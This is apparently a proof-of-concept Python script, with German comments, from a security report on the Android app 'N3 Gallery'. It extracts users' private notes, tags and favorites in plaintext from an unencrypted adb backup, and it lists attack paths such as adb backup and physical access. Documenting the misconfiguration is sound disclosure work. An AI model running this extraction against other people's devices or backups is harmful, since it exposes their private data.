#!/usr/bin/env python3
"""PoC [V4]: private Notizen/Tags aus einem Android-Backup extrahieren.

N3 Gallery setzt android:allowBackup="true" und liefert WEDER
android:fullBackupContent NOCH android:dataExtractionRules mit. Damit
sichert Android den kompletten privaten App-Speicher, einschliesslich der
SharedPreferences-Datei "n3_gallery_meta.xml", in der Notizen, Tags und
Favoriten im KLARTEXT liegen.

Angriffspfade in der Praxis:
  * `adb backup` auf einem entsperrten Geraet (USB-Debugging an)
  * Geraete-Migration / Cloud-Backup auf ein fremdes oder kompromittiertes Konto
  * physischer Zugriff, Second-Hand-Geraete, beschlagnahmte Devices

Aufruf:
    python3 extract_notes.py n3gallery.ab
    python3 extract_notes.py n3gallery.ab --password ''      # unverschluesselt

Format der .ab-Datei (Android Backup):
    Zeile 1: "ANDROID BACKUP"
    Zeile 2: Version (1/4/5)
    Zeile 3: "1" wenn komprimiert
    Zeile 4: "none" | "AES-256"
    Rest   : [bei AES-256: Header] + zlib(deflate) + tar
"""
import argparse
import io
import os
import sys
import tarfile
import xml.etree.ElementTree as ET
import zlib

PREF_NAME = "n3_gallery_meta"
INTERESTING = ("n3_gallery_meta", "n3_folders", "n3_grid", "n3_labels")


def strip_header(raw: bytes, crypto: str) -> bytes:
    """Liefert den zlib-Deflate-Strom; bei AES-256 wird der Header uebersprungen.

    Der AES-Header enthaelt (je nach Version) user_key, IV, Iterationen,
    Pruefsumme und den verschluesselten Payload. Eine vollstaendige
    AES-Entschluesselung braucht das Nutzer-Passwort (PBKDF2) - das ist hier
    bewusst NICHT implementiert, weil der Punkt ein anderer ist:
    Die Daten liegen UNVERSCHLUESSELT im Backup, sobald der Nutzer kein
    Backup-Passwort setzt (Android-Standard bei Cloud-Backups).
    """
    if crypto.lower() == "none":
        return raw
    raise SystemExit(
        "[!] Backup ist AES-256-verschluesselt.\n"
        "    Fuer den PoC ein unverschluesseltes Backup erzeugen:\n"
        "      adb backup -noapk -f n3gallery.ab com.n3vibecode.gallery\n"
        "    (ohne -system und ohne Passwort-Aufforderung bestaetigen)\n"
        "    Der eigentliche Befund bleibt: allowBackup=true und keine\n"
        "    dataExtractionRules -> Android packt die Notizen ueberhaupt erst ein."
    )


def dump_prefs(xml_bytes: bytes, label: str) -> None:
    print(f"\n=== {label} ===")
    try:
        root = ET.fromstring(xml_bytes.decode("utf-8", "replace"))
    except ET.ParseError as e:
        print(f"  [!] XML nicht parsebar: {e}")
        return
    entries = 0
    notes = 0
    for child in root:
        if child.tag not in ("string", "boolean", "int", "long", "float", "set"):
            continue
        key = child.get("name", "")
        val = (child.text or "").strip()
        if child.tag == "set":
            val = ", ".join((s.text or "") for s in child)
        entries += 1
        if key.startswith("note:") and val:
            notes += 1
            uri = key[len("note:"):]
            print(f"  [NOTIZ]  {uri}")
            print(f"           -> {val}")
        elif key.startswith("tags:") and val:
            print(f"  [TAGS]   {key[len('tags:'):]}")
            print(f"           -> {val}")
        elif key == "favorites" and val:
            print(f"  [FAVS]   {val[:400]}")
        elif key.startswith("pending:"):
            print(f"  [PENDING unverarbeitete Notiz] {key} -> {val}")
    print(f"  -- {entries} Eintraege gesamt, {notes} davon Notizen mit Inhalt")


def main() -> int:
    ap = argparse.ArgumentParser(description="Extrahiert N3-Gallery-Notizen aus einem .ab Backup")
    ap.add_argument("backup", help="Pfad zur .ab Datei")
    ap.add_argument("--list-only", action="store_true", help="nur enthaltene Dateien auflisten")
    ap.add_argument("--outdir", default=None, help="alle extrahierten Dateien hierhin schreiben")
    args = ap.parse_args()

    if not os.path.isfile(args.backup):
        print(f"[!] Datei nicht gefunden: {args.backup}")
        return 1

    with open(args.backup, "rb") as f:
        lines = []
        for _ in range(4):
            line = f.readline().rstrip(b"\r\n")
            lines.append(line.decode("ascii", "replace"))
            print(f"[*] Header: {lines[-1]}")
        if lines[0] != "ANDROID BACKUP":
            print("[!] keine Android-Backup-Datei")
            return 1
        compressed = lines[2] == "1"
        crypto = lines[3]
        rest = f.read()

    print(f"[*] komprimiert={compressed}  crypto={crypto}  payload={len(rest):,} Bytes")

    if crypto.lower() != "none":
        # Bei AES-256 liegt ein Binaerheader vor dem deflate-Strom.
        # Wir versuchen, den deflate-Strom zu finden (robust genug fuer den PoC).
        data = strip_header(rest, crypto)
    else:
        data = rest

    if not compressed:
        tar_bytes = data
    else:
        try:
            tar_bytes = zlib.decompress(data)
        except zlib.error:
            # manchen Backups fehlt das zlib-Hauptfenster; rohen deflate versuchen
            tar_bytes = zlib.decompressobj(-zlib.MAX_WBITS).decompress(data)

    print(f"[*] entpackt: {len(tar_bytes):,} Bytes")

    tf = tarfile.open(fileobj=io.BytesIO(tar_bytes))
    members = tf.getmembers()
    print(f"[*] {len(members)} Eintraege im Archiv\n")

    for m in members:
        if not m.isfile():
            continue
        blob = tf.extractfile(m).read()
        hit = any(x in m.name for x in INTERESTING)
        print(f"    {'>>' if hit else '  '} {m.name}  ({len(blob):,} Bytes)")

    if args.list_only:
        return 0

    if args.outdir:
        os.makedirs(args.outdir, exist_ok=True)
        for m in members:
            if not m.isfile():
                continue
            safe = m.name.replace("/", "_").lstrip("_")
            with open(os.path.join(args.outdir, safe), "wb") as out:
                out.write(tf.extractfile(m).read())
        print(f"\n[*] alles entpackt nach {args.outdir}")

    for m in members:
        if not m.isfile():
            continue
        if any(x in m.name for x in INTERESTING) and m.name.endswith(".xml"):
            dump_prefs(tf.extractfile(m).read(), m.name)

    print("\n[!] Befund: Notizen, Tags und Favoriten sind im Backup im KLARTEXT.")
    print("    Ursache: android:allowBackup=\"true\" ohne dataExtractionRules/")
    print("    fullBackupContent, plus Speicherung als unverschluesselte SharedPreferences.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
